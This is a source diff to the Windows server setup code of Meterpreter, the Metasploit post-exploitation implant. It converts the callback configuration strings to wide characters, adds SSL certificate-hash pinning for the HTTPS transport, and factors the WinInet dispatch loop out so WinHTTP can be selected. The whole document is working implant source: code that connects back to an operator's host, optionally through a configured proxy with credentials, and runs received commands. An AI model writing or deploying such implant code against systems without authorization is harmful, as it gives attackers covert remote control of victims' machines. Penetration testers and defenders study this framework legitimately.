@@ -5,14 +5,23 @@
 #include "../../common/common.h"
 #include <ws2tcpip.h>
 
-extern Command *extensionCommands;
+#ifdef USE_WINHTTP
+#include "win/server_setup_winhttp.h"
+#define server_dispatch_http server_dispatch_http_winhttp
+#else
+#include "win/server_setup_wininet.h"
+#define server_dispatch_http server_dispatch_http_wininet
+#endif
 
-char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
-char * global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char * global_meterpreter_proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char * global_meterpreter_proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char * global_meterpreter_proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+extern Command* extensionCommands;
+
+wchar_t* global_meterpreter_transport = L"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+wchar_t* global_meterpreter_url = L"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
+wchar_t* global_meterpreter_ua = L"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+wchar_t* global_meterpreter_proxy = L"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+wchar_t* global_meterpreter_proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+wchar_t* global_meterpreter_proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+PBYTE global_meterpreter_ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00";
 int global_expiration_timeout = 0xb64be661;
 int global_comm_timeout       = 0xaf79257f;
 
@@ -201,23 +210,27 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	return ERROR_SUCCESS;
 }
 
-DWORD establish_tcp_connection(char* url, SOCKET* socketBuffer)
+DWORD establish_tcp_connection(wchar_t* url, SOCKET* socketBuffer)
 {
-	dprintf("[STAGELESS] Url: %s", url);
-	if (strncmp(url, "tcp", 3) == 0)
+	dprintf("[STAGELESS] Url: %S", url);
+	size_t charsConverted;
+	char asciiUrl[512];
+	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), url, sizeof(asciiUrl)-1);
+
+	if (strncmp(asciiUrl, "tcp", 3) == 0)
 	{
 		const int iRetryAttempts = 30;
-		char* pHost = strstr(url, "//") + 2;
+		char* pHost = strstr(asciiUrl, "//") + 2;
 		char* pPort = strrchr(pHost, ':') + 1;
 
 		// check if we're using IPv6
-		if (url[3] == '6')
+		if (asciiUrl[3] == '6')
 		{
 			dprintf("[STAGELESS] IPv6");
 			char* pScopeId = strrchr(pHost, '?') + 1;
 			*(pScopeId - 1) = '\0';
 			*(pPort - 1) = '\0';
-			dprintf("[STAGELESS] IPv6 host %s port %s scopeid %s", pHost, pPort, pScopeId);
+			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
 			return reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, socketBuffer);
 		}
 
@@ -604,166 +617,6 @@ static DWORD server_dispatch(Remote * remote)
 }
 
 /*
- * The servers main dispatch loop for incoming requests using SSL over TCP
- */
-static DWORD server_dispatch_http_wininet(Remote * remote)
-{
-	BOOL running = TRUE;
-	LONG result = ERROR_SUCCESS;
-	Packet * packet = NULL;
-	THREAD * cpt = NULL;
-	URL_COMPONENTS bits;
-	DWORD ecount = 0;
-	DWORD delay = 0;
-	char tmpHostName[512];
-	char tmpUrlPath[1024];
-
-	remote->expiration_time = 0;
-	if (global_expiration_timeout > 0)
-	{
-		remote->expiration_time = current_unix_timestamp() + global_expiration_timeout;
-	}
-
-	remote->comm_timeout = global_comm_timeout;
-	remote->start_time = current_unix_timestamp();
-	remote->comm_last_packet = current_unix_timestamp();
-
-	// Allocate the top-level handle
-	if (!strcmp(global_meterpreter_proxy, "METERPRETER_PROXY"))
-	{
-		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	}
-	else
-	{
-		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PROXY, global_meterpreter_proxy, NULL, 0);
-	}
-
-	if (!remote->hInternet)
-	{
-		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
-		return 0;
-	}
-
-	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);
-
-	// The InternetCrackUrl method was poorly designed...
-	memset(tmpHostName, 0, sizeof(tmpHostName));
-	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));
-
-	memset(&bits, 0, sizeof(bits));
-	bits.dwStructSize = sizeof(bits);
-	bits.dwHostNameLength = sizeof(tmpHostName)-1;
-	bits.lpszHostName = tmpHostName;
-	bits.dwUrlPathLength = sizeof(tmpUrlPath)-1;
-	bits.lpszUrlPath = tmpUrlPath;
-
-	InternetCrackUrl(remote->url, 0, 0, &bits);
-
-	remote->uri = _strdup(tmpUrlPath);
-
-	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
-	dprintf("[DISPATCH] Host: %s Port: %u", tmpHostName, bits.nPort);
-
-	// Allocate the connection handle
-	remote->hConnection = InternetConnect(remote->hInternet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-	if (!remote->hConnection)
-	{
-		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
-		return 0;
-	}
-
-	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);
-
-	//authentication
-	if (!(strcmp(global_meterpreter_proxy_username, "METERPRETER_USERNAME_PROXY") == 0))
-	{
-		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, global_meterpreter_proxy_username, (DWORD)strlen(global_meterpreter_proxy_username) + 1);
-		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, global_meterpreter_proxy_password, (DWORD)strlen(global_meterpreter_proxy_password) + 1);
-		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", global_meterpreter_proxy_username, global_meterpreter_proxy_password);
-	}
-
-	// Bring up the scheduler subsystem.
-	result = scheduler_initialize(remote);
-	if (result != ERROR_SUCCESS)
-	{
-		return result;
-	}
-
-	while (running)
-	{
-		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp())
-		{
-			dprintf("[DISPATCH] Shutting down server due to communication timeout");
-			break;
-		}
-
-		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp())
-		{
-			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
-			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
-			break;
-		}
-
-		if (event_poll(serverThread->sigterm, 0))
-		{
-			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
-			break;
-		}
-
-		dprintf("[DISPATCH] Reading data from the remote side...");
-		result = packet_receive(remote, &packet);
-		if (result != ERROR_SUCCESS)
-		{
-
-			// Update the timestamp for empty replies
-			if (result == ERROR_EMPTY)
-			{
-				remote->comm_last_packet = current_unix_timestamp();
-			}
-
-			if (ecount < 10)
-			{
-				delay = 10 * ecount;
-			}
-			else
-			{
-				delay = 100 * ecount;
-			}
-
-			ecount++;
-
-			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
-			Sleep(min(10000, delay));
-			continue;
-		}
-
-		remote->comm_last_packet = current_unix_timestamp();
-
-		// Reset the empty count when we receive a packet
-		ecount = 0;
-
-		dprintf("[DISPATCH] Returned result: %d", result);
-
-		running = command_handle(remote, packet);
-		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
-	}
-
-	// Close WinInet handles
-	InternetCloseHandle(remote->hConnection);
-	InternetCloseHandle(remote->hInternet);
-
-	dprintf("[DISPATCH] calling scheduler_destroy...");
-	scheduler_destroy();
-
-	dprintf("[DISPATCH] calling command_join_threads...");
-	command_join_threads();
-
-	dprintf("[DISPATCH] leaving server_dispatch.");
-
-	return result;
-}
-
-/*
  * Get the session id that this meterpreter server is running in.
  */
 DWORD server_sessionid()
@@ -778,7 +631,7 @@ DWORD server_sessionid()
 	{
 		if (!pProcessIdToSessionId)
 		{
-			hKernel = LoadLibrary("kernel32.dll");
+			hKernel = LoadLibraryA("kernel32.dll");
 			if (hKernel)
 			{
 				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(hKernel, "ProcessIdToSessionId");
@@ -870,7 +723,7 @@ DWORD server_setup(SOCKET fd)
 				pRemote->url += 1;
 			}
 
-			if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_SSL") == 0)
+			if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_SSL") == 0)
 			{
 				pRemote->transport = METERPRETER_TRANSPORT_SSL;
 				dprintf("[SERVER] Using SSL transport on socket %ul...", fd);
@@ -883,12 +736,21 @@ DWORD server_setup(SOCKET fd)
 					break;
 				}
 			}
-			else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTPS") == 0)
+			else if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_HTTPS") == 0)
 			{
+				PBYTE hash = global_meterpreter_ssl_cert_hash;
 				pRemote->transport = METERPRETER_TRANSPORT_HTTPS;
-				dprintf("[SERVER] Using HTTPS transport...");
+				dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
+					hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
+					hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
+
+				if (strcmp(hash, "METERPRETER_SSL_CERT_HASH") != 0)
+				{
+					pRemote->pCertHash = hash;
+					dprintf("[SERVER] is validating hashes %p", pRemote->pCertHash);
+				}
 			}
-			else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTP") == 0)
+			else if (wcscmp(global_meterpreter_transport + 12, L"TRANSPORT_HTTP") == 0)
 			{
 				pRemote->transport = METERPRETER_TRANSPORT_HTTP;
 				dprintf("[SERVER] Using HTTP transport...");
@@ -971,7 +833,8 @@ DWORD server_setup(SOCKET fd)
 				}
 
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
-				server_dispatch_http_wininet(pRemote);
+				server_dispatch_http(pRemote, serverThread, global_expiration_timeout, global_comm_timeout, global_meterpreter_ua,
+					global_meterpreter_proxy, global_meterpreter_proxy_username, global_meterpreter_proxy_password);
 
 				dprintf("[SERVER] Deregistering dispatch routines...");
 				deregister_dispatch_routines(pRemote);
